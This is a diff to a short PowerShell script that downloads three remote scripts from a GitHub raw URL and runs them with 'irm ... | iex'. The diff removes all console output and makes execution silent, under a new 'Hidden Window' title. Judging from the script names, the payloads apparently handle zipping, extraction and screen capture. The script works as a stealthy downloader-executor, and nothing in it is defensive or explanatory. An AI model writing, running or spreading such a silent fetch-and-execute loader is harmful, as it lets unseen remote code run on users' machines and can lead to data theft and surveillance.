@@ -1,21 +1,12 @@
-# PowerShell Multi-Command Executor
+# PowerShell Multi-Command Executor (Hidden Window)
 $commands = @(
     'irm https://raw.githubusercontent.com/bunny1233/mynewscripts/main/zip2.txt | iex',
-    'irm https://raw.githubusercontent.com/bunny1233/mynewscripts/main/extract-1.txt | iex',
+    'irm https://raw.githubusercontent.com/bunny1233/mynewscripts/main/extract-1.txt | iex', 
     'irm https://raw.githubusercontent.com/bunny1233/mynewscripts/main/screen.txt | iex'
 )
 
-Write-Host "PowerShell Multi-Command Executor" -ForegroundColor Cyan
-Write-Host "=================================" -ForegroundColor Cyan
-
+# Execute all commands silently
 foreach ($cmd in $commands) {
-    Write-Host "`nExecuting: $cmd" -ForegroundColor Yellow
-    Write-Host "---------------------------------" -ForegroundColor Gray
-    
-    # Execute the command
     Invoke-Expression $cmd
-    
-    Write-Host "---------------------------------" -ForegroundColor Gray
+    Start-Sleep -Seconds 2  # Wait 2 seconds between commands
 }
-
-Write-Host "`nAll commands executed!" -ForegroundColor Green
